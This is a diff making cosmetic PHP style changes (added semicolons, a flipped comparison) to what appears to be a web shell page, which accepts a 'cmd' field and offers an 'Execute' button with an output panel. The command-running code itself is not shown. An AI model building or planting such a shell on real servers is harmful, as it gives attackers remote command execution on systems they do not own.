@@ -50,7 +50,7 @@ if (!empty($_POST['cmd'])) {
         <form method="POST">
             <div class="form-group">
                 <label for="cmd"><strong>Command</strong></label>
-                <input type="text" class="form-control" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>" required>
+                <input type="text" class="form-control" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8'); ?>" required>
             </div>
             <button type="submit" class="btn btn-primary">Execute</button>
         </form>
@@ -60,9 +60,9 @@ if (!empty($_POST['cmd'])) {
             <h2> Output </h2>
         </div>
         <pre>
-<?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?>
+<?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8'); ?>
         </pre>
-<?php elseif (!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'): ?>
+<?php elseif (!$cmd && 'POST' == $_SERVER['REQUEST_METHOD']): ?>
         <div class="pb-2 mt-4 mb-2">
             <h2> Output </h2>
         </div>
